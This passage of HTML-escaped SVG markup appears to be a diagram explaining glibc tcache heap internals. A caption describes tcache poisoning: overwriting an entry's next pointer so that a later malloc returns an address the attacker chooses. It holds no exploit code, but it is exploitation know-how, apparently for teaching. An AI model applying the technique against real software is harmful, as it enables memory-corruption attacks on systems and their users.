d=&quot;M 260 461 L 240 461 L 240 601 L 260 601&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-width=&quot;2&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;path d=&quot;M 305 556 L 305 611 L 200 611 L 200 741 L 280.4 741 L 280.37 753.83&quot; fill=&quot;none&quot; stroke=&quot;#b85450&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;stroke&quot;&#x2F;&gt;&lt;path d=&quot;M 280.36 759.08 L 276.88 752.07 L 280.37 753.83 L 283.88 752.09 Z&quot; fill=&quot;#b85450&quot; stroke=&quot;#b85450&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;rect x=&quot;250&quot; y=&quot;506&quot; width=&quot;110&quot; height=&quot;50&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;100%&quot; height=&quot;100%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 531px; margin-left: 305px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: center; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: nowrap; &quot;&gt;Bin&lt;br &#x2F;&gt;1&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;305&quot; y=&quot;535&quot; fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-size=&quot;12px&quot; text-anchor=&quot;middle&quot;&gt;Bin...&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;rect x=&quot;430&quot; y=&quot;506&quot; width=&quot;110&quot; height=&quot;50&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;100%&quot; height=&quot;100%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 531px; margin-left: 485px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: center; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: nowrap; &quot;&gt;&lt;font style=&quot;font-size: 12px&quot;&gt;Bin &lt;br &#x2F;&gt;&lt;span style=&quot;background-color: rgb(255 , 255 , 255) ; font-family: &amp;quot;consolas&amp;quot; , &amp;quot;courier new&amp;quot; , monospace ; white-space: pre&quot;&gt;TCACHE_MAX_BINS&lt;&#x2F;span&gt;&lt;&#x2F;font&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;485&quot; y=&quot;535&quot; fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-size=&quot;12px&quot; text-anchor=&quot;middle&quot;&gt;Bin...&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;ellipse cx=&quot;375&quot; cy=&quot;531&quot; rx=&quot;5&quot; ry=&quot;5&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;ellipse cx=&quot;395&quot; cy=&quot;531&quot; rx=&quot;5&quot; ry=&quot;5&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;ellipse cx=&quot;415&quot; cy=&quot;531&quot; rx=&quot;5&quot; ry=&quot;5&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;rect x=&quot;530&quot; y=&quot;461&quot; width=&quot;20&quot; height=&quot;140&quot; fill=&quot;none&quot; stroke=&quot;none&quot; transform=&quot;rotate(-180,540,531)&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;path d=&quot;M 550 461 L 530 461 L 530 601 L 550 601&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-width=&quot;2&quot; stroke-miterlimit=&quot;10&quot; transform=&quot;rotate(-180,540,531)&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;path d=&quot;M 160 546 L 233.63 546&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;stroke&quot;&#x2F;&gt;&lt;path d=&quot;M 238.88 546 L 231.88 549.5 L 233.63 546 L 231.88 542.5 Z&quot; fill=&quot;#000000&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;path d=&quot;M 385 801 L 560 801 L 560 717.37&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;stroke&quot;&#x2F;&gt;&lt;path d=&quot;M 560 712.12 L 563.5 719.12 L 560 717.37 L 556.5 719.12 Z&quot; fill=&quot;#000000&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;rect x=&quot;225&quot; y=&quot;761&quot; width=&quot;160&quot; height=&quot;80&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;100%&quot; height=&quot;100%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe flex-start; justify-content: unsafe flex-start; width: 162px; height: 80px; padding-top: 761px; margin-left: 225px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: left; width: 162px; height: 80px; overflow: hidden; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; width: 100%; height: 100%; white-space: nowrap; &quot;&gt;&lt;p style=&quot;margin: 4px 0px 0px ; text-align: center ; line-height: 120%&quot;&gt;&lt;b&gt;tcache_entry&lt;&#x2F;b&gt;&lt;&#x2F;p&gt;&lt;hr &#x2F;&gt;   tcache_entry *next&lt;hr &#x2F;&gt;&lt;b&gt;&lt;div style=&quot;text-align: center&quot;&gt;&lt;b&gt;0x603260&lt;&#x2F;b&gt;&lt;&#x2F;div&gt;&lt;&#x2F;b&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;225&quot; y=&quot;773&quot; fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-size=&quot;12px&quot;&gt;tcache_entry   tcache_entry...&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;path d=&quot;M 140 681 L 180 681 L 180 652.6 L 219.59 652.6&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;stroke&quot;&#x2F;&gt;&lt;path d=&quot;M 224.84 652.6 L 217.84 656.1 L 219.59 652.6 L 217.84 649.1 Z&quot; fill=&quot;#000000&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;path d=&quot;M 140 681 L 180 681 L 180 772 L 218.79 771.97&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;stroke&quot;&#x2F;&gt;&lt;path d=&quot;M 224.04 771.96 L 217.05 775.47 L 218.79 771.97 L 217.04 768.47 Z&quot; fill=&quot;#000000&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;rect x=&quot;20&quot; y=&quot;651&quot; width=&quot;120&quot; height=&quot;60&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;100%&quot; height=&quot;100%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe center; justify-content: unsafe center; width: 118px; height: 1px; padding-top: 681px; margin-left: 21px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: center; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: normal; word-wrap: normal; &quot;&gt;void* malloc()&lt;br &#x2F;&gt;(malloc 1)&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;80&quot; y=&quot;685&quot; fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-size=&quot;12px&quot; text-anchor=&quot;middle&quot;&gt;void* malloc()...&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;rect x=&quot;500&quot; y=&quot;651&quot; width=&quot;120&quot; height=&quot;60&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;100%&quot; height=&quot;100%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe center; justify-content: unsafe center; width: 118px; height: 1px; padding-top: 681px; margin-left: 501px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: center; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 12px; font-family: Helvetica; color: black; line-height: 1.2; pointer-events: all; white-space: normal; word-wrap: normal; &quot;&gt;&lt;b&gt;*0xFFFF12AD&lt;&#x2F;b&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;560&quot; y=&quot;685&quot; fill=&quot;black&quot; font-family=&quot;Helvetica&quot; font-size=&quot;12px&quot; text-anchor=&quot;middle&quot;&gt;*0xFFFF12AD&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;rect x=&quot;0&quot; y=&quot;741&quot; width=&quot;160&quot; height=&quot;100&quot; fill=&quot;none&quot; stroke=&quot;none&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;100%&quot; height=&quot;100%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe center; justify-content: unsafe flex-start; width: 158px; height: 1px; padding-top: 791px; margin-left: 2px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: left; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 12px; font-family: Helvetica; color: black; line-height: 1.2; pointer-events: all; white-space: normal; word-wrap: normal; &quot;&gt;If we can write data to the malloc region, we can set the address we want to overwrite.&lt;br &#x2F;&gt;&lt;br &#x2F;&gt;The next malloc will &lt;br &#x2F;&gt;return &lt;font style=&quot;font-size: 11px&quot; face=&quot;Lucida Console&quot;&gt;0x603260&lt;&#x2F;font&gt;.&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;2&quot; y=&quot;795&quot; fill=&quot;black&quot; font-family=&quot;Helvetica&quot; font-size=&quot;12px&quot;&gt;If we can write data to th...&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;rect x=&quot;0&quot; y=&quot;941&quot; width=&quot;160&quot; height=&quot;100&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;100%&quot; height=&quot;100%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe flex-start; justify-content: unsafe flex-start; width: 162px; height: 100px; padding-top: 941px; margin-left: 0px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: left; width: 162px; height: 100px; overflow: hidden; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; width: 100%; height: 100%; white-space: nowrap; &quot;&gt;&lt;p style=&quot;margin: 4px 0px 0px ; text-align: center ; line-height: 100%&quot;&gt;&lt;b&gt;tcache_perthread_struct&lt;&#x2F;b&gt;&lt;&#x2F;p&gt;&lt;hr size=&quot;1&quot; &#x2F;&gt;   char counts[]&lt;br &#x2F;&gt;&lt;hr &#x2F;&gt;   tcache_entry *entries[]&lt;hr &#x2F;&gt;&lt;b&gt;&lt;div style=&quot;text-align: center&quot;&gt;&lt;b&gt;0x7ffff7dcfc40&lt;&#x2F;b&gt;&lt;&#x2F;div&gt;&lt;&#x2F;b&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;0&quot; y=&quot;953&quot; fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-size=&quot;12px&quot;&gt;tcache_perthread_struct   c...&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;path d=&quot;M 385 1141 L 493.63 1141&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;stroke&quot;&#x2F;&gt;&lt;path d=&quot;M 498.88 1141 L 491.88 1144.5 L 493.63 1141 L 491.88 1137.5 Z&quot; fill=&quot;#000000&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;rect x=&quot;225&quot; y=&quot;1101&quot; width=&quot;160&quot; height=&quot;80&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;100%&quot; height=&quot;100%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe flex-start; justify-content: unsafe flex-start; width: 162px; height: 80px; padding-top: 1101px; margin-left: 225px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: left; width: 162px; height: 80px; overflow: hidden; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; width: 100%; height: 100%; white-space: nowrap; &quot;&gt;&lt;p style=&quot;margin: 4px 0px 0px ; text-align: center ; line-height: 120%&quot;&gt;&lt;b&gt;tcache_entry&lt;&#x2F;b&gt;&lt;&#x2F;p&gt;&lt;hr &#x2F;&gt;   tcache_entry *next&lt;hr &#x2F;&gt;&lt;b&gt;&lt;div style=&quot;text-align: center&quot;&gt;&lt;b&gt;0x603260&lt;&#x2F;b&gt;&lt;&#x2F;div&gt;&lt;&#x2F;b&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;225&quot; y=&quot;1113&quot; fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-size=&quot;12px&quot;&gt;tcache_entry   tcache_entry...&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;rect x=&quot;240&quot; y=&quot;921&quot; width=&quot;20&quot; height=&quot;140&quot; fill=&quot;none&quot; stroke=&quot;none&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;path d=&quot;M 260 921 L 240 921 L 240 1061 L 260 1061&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-width=&quot;2&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;path d=&quot;M 305 1016 L 305 1081 L 560 1081 L 560 1104.63&quot; fill=&quot;none&quot; stroke=&quot;#b85450&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;stroke&quot;&#x2F;&gt;&lt;path d=&quot;M 560 1109.88 L 556.5 1102.88 L 560 1104.63 L 563.5 1102.88 Z&quot; fill=&quot;#b85450&quot; stroke=&quot;#b85450&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;rect x=&quot;250&quot; y=&quot;966&quot; width=&quot;110&quot; height=&quot;50&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;100%&quot; height=&quot;100%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 991px; margin-left: 305px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: center; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: nowrap; &quot;&gt;Bin&lt;br &#x2F;&gt;1&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;305&quot; y=&quot;995&quot; fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-size=&quot;12px&quot; text-anchor=&quot;middle&quot;&gt;Bin...&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;rect x=&quot;430&quot; y=&quot;966&quot; width=&quot;110&quot; height=&quot;50&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;100%&quot; height=&quot;100%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 991px; margin-left: 485px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: center; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: nowrap; &quot;&gt;&lt;font style=&quot;font-size: 12px&quot;&gt;Bin &lt;br &#x2F;&gt;&lt;span style=&quot;background-color: rgb(255 , 255 , 255) ; font-family: &amp;quot;consolas&amp;quot; , &amp;quot;courier new&amp;quot; , monospace ; white-space: pre&quot;&gt;TCACHE_MAX_BINS&lt;&#x2F;span&gt;&lt;&#x2F;font&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;485&quot; y=&quot;995&quot; fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-size=&quot;12px&quot; text-anchor=&quot;middle&quot;&gt;Bin...&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;ellipse cx=&quot;375&quot; cy=&quot;991&quot; rx=&quot;5&quot; ry=&quot;5&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;ellipse cx=&quot;395&quot; cy=&quot;991&quot; rx=&quot;5&quot; ry=&quot;5&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;ellipse cx=&quot;415&quot; cy=&quot;991&quot; rx=&quot;5&quot; ry=&quot;5&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;rect x=&quot;530&quot; y=&quot;921&quot; width=&quot;20&quot; height=&quot;140&quot; fill=&quot;none&quot; stroke=&quot;none&quot; transform=&quot;rotate(-180,540,991)&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;path d=&quot;M 550 921 L 530 921 L 530 1061 L 550 1061&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-width=&quot;2&quot; stroke-miterlimit=&quot;10&quot; transform=&quot;rotate(-180,540,991)&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;path d=&quot;M 160 1006 L 233.63 1006&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;stroke&quot;&#x2F;&gt;&lt;path d=&quot;M 238.88 1006 L 231.88 1009.5 L 233.63 1006 L 231.88 1002.5 Z&quot; fill=&quot;#000000&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;path d=&quot;M 385 1261 L 560 1261 L 560 1177.37&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;stroke&quot;&#x2F;&gt;&lt;path d=&quot;M 560 1172.12 L 563.5 1179.12 L 560 1177.37 L 556.5 1179.12 Z&quot; fill=&quot;#000000&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;rect x=&quot;225&quot; y=&quot;1221&quot; width=&quot;160&quot; height=&quot;80&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;100%&quot; height=&quot;100%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe flex-start; justify-content: unsafe flex-start; width: 162px; height: 80px; padding-top: 1221px; margin-left: 225px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: left; width: 162px; height: 80px; overflow: hidden; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; width: 100%; height: 100%; white-space: nowrap; &quot;&gt;&lt;p style=&quot;margin: 4px 0px 0px ; text-align: center ; line-height: 120%&quot;&gt;&lt;b&gt;tcache_entry&lt;&#x2F;b&gt;&lt;&#x2F;p&gt;&lt;hr &#x2F;&gt;   tcache_entry *next&lt;hr &#x2F;&gt;&lt;b&gt;&lt;div style=&quot;text-align: center&quot;&gt;&lt;b&gt;0x603260&lt;&#x2F;b&gt;&lt;&#x2F;div&gt;&lt;&#x2F;b&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;225&quot; y=&quot;1233&quot; fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-size=&quot;12px&quot;&gt;tcache_entry   tcache_entry...&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;path d=&quot;M 140 1101 L 180 1101 L 180 1112.6 L 219.59 1112.6&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;stroke&quot;&#x2F;&gt;&lt;path d=&quot;M 224.84 1112.6 L 217.84 1116.1 L 219.59 1112.6 L 217.84 1109.1 Z&quot; fill=&quot;#000000&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;path d=&quot;M 140 1101 L 180 1101 L 180 1232 L 218.79 1231.97&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;stroke&quot;&#x2F;&gt;&lt;path d=&quot;M 224.04 1231.96 L 217.05 1235.47 L 218.79 1231.97 L 217.04 1228.47 Z&quot; fill=&quot;#000000&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;rect x=&quot;20&quot; y=&quot;1071&quot; width=&quot;120&quot; height=&quot;60&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;100%&quot; height=&quot;100%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe center; justify-content: unsafe center; width: 118px; height: 1px; padding-top: 1101px; margin-left: 21px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: center; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: normal; word-wrap: normal; &quot;&gt;void* malloc()&lt;br &#x2F;&gt;(malloc 1)&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;80&quot; y=&quot;1105&quot; fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-size=&quot;12px&quot; text-anchor=&quot;middle&quot;&gt;void* malloc()...&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;rect x=&quot;500&quot; y=&quot;1111&quot; width=&quot;120&quot; height=&quot;60&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 